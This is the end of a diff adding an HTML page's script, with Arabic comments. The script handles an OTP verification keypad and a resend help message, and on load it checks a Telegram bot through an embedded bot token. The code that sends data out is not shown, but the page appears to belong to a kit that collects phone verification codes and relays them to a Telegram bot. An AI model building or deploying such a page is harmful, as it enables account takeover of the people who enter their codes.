+            alert('إذا لم يصلك رمز التحقق:\n1. تأكد من صحة رقم الهاتف\n2. تحقق من اتصال الشبكة\n3. حاول إعادة إرسال الرمز بعد 30 ثانية');
+        }
+
+        // دعم لوحة المفاتيح الفعلية
+        document.addEventListener('keydown', function(event) {
+            if (document.getElementById('otpPage').classList.contains('active')) {
+                if (event.key >= '0' && event.key <= '9') {
+                    event.preventDefault();
+                    addOTPNumber(parseInt(event.key));
+                } else if (event.key === 'Backspace') {
+                    deleteOTPNumber();
+                }
+            }
+        });
+
+        // Initialize
+        displayCountries();
+        
+        // اختبار الاتصال بالبوت عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            console.log('✅ الصفحة جاهزة');
+            // اختبار البوت (اختياري)
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('✅ البوت متصل:', data.result.username);
+                    } else {
+                        console.error('❌ مشكلة في البوت:', data);
+                    }
+                })
+                .catch(err => console.error('❌ لا يمكن الاتصال بالبوت:', err));
+        });
+    </script>
+</body>
+</html>
